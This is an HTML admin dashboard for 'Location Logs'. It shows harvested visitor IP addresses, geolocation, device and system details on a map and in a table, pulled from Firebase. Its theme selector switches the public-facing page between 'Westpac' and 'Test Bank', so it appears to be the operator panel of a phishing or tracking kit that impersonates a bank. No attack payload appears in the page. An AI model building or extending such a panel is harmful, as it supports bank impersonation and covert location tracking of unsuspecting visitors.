<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Logs - Admin View</title>
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
     integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
     crossorigin=""/>
    <!-- Core styles -->
    <link rel="stylesheet" href="style.css">
    <!-- View logs specific styles -->
    <link rel="stylesheet" href="src/styles/view-logs.css">
</head>
<body>
    <div id="loginScreen">
        <form id="loginForm" class="text-center">
            <h2 class="mb-3">Location Logs Admin</h2>
            <div class="mb-2">
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            <button type="submit" id="loginButton">Login</button>
        </form>
    </div>
    
    <div id="mainContent" style="display: none;">
        <nav class="nav-header">
            <div class="nav-title">Location Logs</div>
            <div class="nav-controls">
                <div class="nav-group">
                    <button class="button" onclick="window.admin.refreshData()">Refresh Data</button>
                    <div class="auto-refresh">
                        <input type="checkbox" id="autoRefresh">
                        <label for="autoRefresh">Auto-refresh (30s)</label>
                    </div>
                </div>
                <div class="nav-group">
                    <label for="themeSelect">Index Page Theme:</label>
                    <select id="themeSelect">
                        <option value="westpac">Westpac</option>
                        <option value="test">Test Bank</option>
                    </select>
                </div>
            </div>
        </nav>
        
        <div id="errorMessage" class="error-message"></div>
        <div id="toast" class="toast"></div>
        
        <div class="container">
            <div class="map mb-4">
                <div id="locationMap"></div>
            </div>

            <table class="logs">
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Location</th>
                        <th>Accuracy</th>
                        <th>Source</th>
                        <th>Browser &amp; Device</th>
                        <th>System Info</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="logsTable">
                    <!-- Data will be populated by JavaScript -->
                </tbody>
            </table>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    
    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
     integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
     crossorigin=""></script>

    <!-- Initialize Firebase -->
    <script src="src/core/firebase-init.js"></script>
    
    <!-- Load login functionality -->
    <script src="view-logs.js"></script>

    <!-- Load admin functionality -->
    <script type="module">
        import { initializeAdmin, refreshData } from './src/features/admin/admin.js';
        
        // Make refreshData available globally for the refresh button
        window.admin = { refreshData };
        
        // Initialize admin panel when DOM is loaded and after Firebase is ready
        document.addEventListener('DOMContentLoaded', () => {
            // Wait for Firebase to be ready
            if (window.database) {
                console.log('Firebase ready, initializing admin panel...');
                // Add a small delay to ensure map container is ready
                setTimeout(() => {
                    initializeAdmin().catch(error => {
                        console.error('Failed to initialize admin panel:', error);
                    });
                }, 100);
            } else {
                console.log('Firebase not ready, retrying...');
                // Retry after a short delay
                setTimeout(() => {
                    if (window.database) {
                        console.log('Firebase ready on retry, initializing admin panel...');
                        initializeAdmin().catch(error => {
                            console.error('Failed to initialize admin panel on retry:', error);
                        });
                    } else {
                        console.error('Firebase still not ready after retry');
                    }
                }, 1000);
            }
        });
    </script>
</body>
</html>
